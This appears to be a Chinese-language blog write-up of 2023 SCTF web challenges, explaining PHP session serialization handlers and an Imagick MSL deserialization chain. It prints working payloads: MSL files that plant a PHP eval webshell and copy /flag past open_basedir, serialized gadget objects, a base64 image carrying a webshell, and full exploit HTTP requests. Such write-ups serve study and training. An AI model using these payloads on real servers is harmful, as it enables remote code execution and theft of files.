<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kkkl|s:4:&quot;1234&quot;;</span><br></pre></td></tr></table></figure>

<p>php_binary 处理器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK&#x27;]=&#x27;kkkl&#x27;</span><br></pre></td></tr></table></figure>

<p>序列化之后的结果是</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoRIJ"><img src="https://s1.ax1x.com/2023/06/23/pCYoRIJ.png" alt="pCYoRIJ.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKs:4:&quot;kkkl&quot;;</span><br></pre></td></tr></table></figure>

<p>php_serialize 处理器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;kkkl&#x27;] = &quot;123&quot;</span><br></pre></td></tr></table></figure>

<p>序列化之后的结果是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1&#123;s:4:&quot;kkkl&quot;,s:3:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;panda&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">XianZhi</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;caption:&amp;lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&amp;gt;&quot; /&gt;</span><br><span class="line"> &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt;</span><br><span class="line"> &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure>

<p>写这道题之前我先写一下 对 去年国赛 这道backdoor的分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="comment">// echo &quot;include&quot;;</span></span><br><span class="line">            <span class="comment">// var_dump($this-&gt;path);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> html /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> readflag/readflag /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s#http://deb.debian.org#http://mirrors.aliyun.com#g&#x27;</span> /etc/apt/sources.list &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get install -y libmagickwand-dev --no-install-recommends</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install imagick &amp;&amp; docker-php-ext-enable imagick &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 555 /var/www/html &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 400 /flag &amp;&amp;\</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 111 /readflag &amp;&amp; <span class="built_in">chmod</span> u+s /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>web 目录不可写 所以无法直接 通过 imagick 来直接rce  然后又看到上面有个 include  所以 我们可以文件包含  来rce</p>
<p>但是 这里面 include 实在 sleep 中的 但是里又没有 ser 函数   所以这里可以使用 session 序列化的时候来触发ser 然后触发 sleep  </p>
<p>imagick  的核心攻击思路就是 又可控的实例化类 然后开启 imagick   扩展</p>
<p>可以向服务器发送临时文件 会被保存在 &#x2F;tmp&#x2F;phpxxxx下 然后 我们可以控制它的格式  </p>
<p>首先  先去生成  &#x2F;tmp&#x2F;sessxxxx 文件 以便后续 触发反序列化</p>
<p>​	</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$backdoor</span>=<span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="variable">$backdoor</span>-&gt;<span class="class"><span class="keyword">class</span>=&quot;<span class="title">imagick</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">argv</span>=&quot;<span class="title">vid</span>:<span class="title">msl</span>:/<span class="title">tmp</span>/<span class="title">php</span>*&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">backdoor</span>-&gt;<span class="title">do_exec_func</span>=0;</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">backdoor</span>);</span></span><br></pre></td></tr></table></figure>

<p>post  传的文件是</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYo4R1"><img src="https://s1.ax1x.com/2023/06/23/pCYo4R1.png" alt="pCYo4R1.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYo5xx"><img src="https://s1.ax1x.com/2023/06/23/pCYo5xx.png" alt="pCYo5xx.png"></a></p>
<p>然后就会生成 这个格式的文件</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYooM6"><img src="https://s1.ax1x.com/2023/06/23/pCYooM6.png" alt="pCYooM6.png"></a></p>
<p>看到这个文件应该就知道如何反序列化了  php默认session 序列化的引擎是 php 所以可以这样写  因为 写的是 readflag文件 所以命令执行 </p>
<p>有文件包含 所以这里面 可以在| 前面写入 一句话木马 前面 我写| 前面的是 SESSION[‘XXXXX’] 是 XXXX  但是经过测试 这里是不影响 反序列化 的 所以我们 可以将shell 写入里面 然后后面就是 序列化之后的数据了包含里面的这个session 文件  session 序列化引擎 默认的是php引擎 所以写入  这样格式的 序列化数据 然后 等待触发反序列化 指定包含 sess文件 （shell）</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYTMeU"><img src="https://s1.ax1x.com/2023/06/23/pCYTMeU.png" alt="pCYTMeU.png"></a></p>
<p>这里还有要注意的是 </p>
<p>imagetick 里面  图片格式要求比较严格 所以这里 要找可以往 图片末尾添加脏数据的 才会被 保存下来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">inline:data:<span class="comment">//image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=</span></span><br></pre></td></tr></table></figure>



<p>然后看这个fumo_backdoor</p>
<p>配置里面题目不出网  所以不能用 文件包含 shell的方法 并且 我也尝试了 readfile 是没有include 的作用的 所以我们 需要直接的去读文件 但是他有限制了一个东西 </p>
<p>open_basedir 限制php打开的目录是 当前目录 和 &#x2F;tmp 目录 所以 通过尝试绕过 flag 直接通过readfile 去读根目录下的flag文件就没有必要了  因为限制了 php打开的目录 </p>
<p>因为里面 这个 imagetick  可以去写文件 然后他是不受open_dir 的作用限制的 所以</p>
<p>我们可以通过  imagetick   协议  吧flag文件 写入 tmp 目录下 就可以绕过 open_dir 限制了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /?cmd=unserialze&amp;data=O:<span class="number">13</span>:%<span class="number">22</span>fumo_backdoor%<span class="number">22</span>:<span class="number">4</span>:%<span class="number">7</span>Bs:<span class="number">4</span>:%<span class="number">22</span>path%<span class="number">22</span>;N;s:<span class="number">4</span>:%<span class="number">22</span>argv%<span class="number">22</span>;s:<span class="number">17</span>:%<span class="number">22</span>vid:msl:/tmp/php%<span class="number">2</span>A%<span class="number">22</span>;s:<span class="number">4</span>:%<span class="number">22</span>func%<span class="number">22</span>;N;s:<span class="number">5</span>:%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>;s:<span class="number">7</span>:%<span class="number">22</span>imagick%<span class="number">22</span>;%<span class="number">7</span>D HTTP/<span class="number">1.1</span></span><br><span class="line">User-Agent: Apifox/<span class="number">1.0</span>.<span class="number">0</span> (https:<span class="comment">//apifox.com)</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Host: 43.143.197.175:18080</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=--------------------------570182355206858934606490</span></span><br><span class="line"><span class="comment">Content-Length: 343</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">----------------------------570182355206858934606490</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;kkkl.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;app1:/flag&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/FLAG&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">----------------------------570182355206858934606490--</span></span><br></pre></td></tr></table></figure>

<p>这里面可以用 app1 协议来获取  &#x2F;flag的值 </p>
<p>看别的师傅是通过官网上的 把所有协议都便利试了一遍</p>
<p>其实这个题的 精髓 最重要的考点也就是这个 </p>
<p>后面其实就是跟上面常规的东西了 不需要去做什么特别的改变</p>
<p>imagick  官网</p>
<p> <a target="_blank" rel="noopener" href="https://imagemagick.org/script/formats.php">https://imagemagick.org/script/formats.php</a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYTZzq"><img src="https://s1.ax1x.com/2023/06/23/pCYTZzq.png" alt="pCYTZzq.png"></a></p>
<p>看官网这里面好多都是可以的</p>
<p> 可以一个一个试试</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYTlo4"><img src="https://s1.ax1x.com/2023/06/23/pCYTlo4.png" alt="pCYTlo4.png"></a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">kkkl</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/06/23/2023 SCTF/">http://example.com/2023/06/23/2023 SCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pin%E7%A0%81%E8%AE%A1%E7%AE%97-imagick-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">pin码计算  imagick  原型链污染 原生类利用</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/06/28/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%80%BB%E7%BB%93/"><i class="fa fa-chevron-left">  </i><span>原生类总结</span></a></div><div class="next-post pull-right"><a href="/2023/06/23/2023%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"><span>2023年第三届陕西省大学生网络安全技能大赛</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://s1.ax1x.com/2023/06/14/pCn3c6O.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By kkkl</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>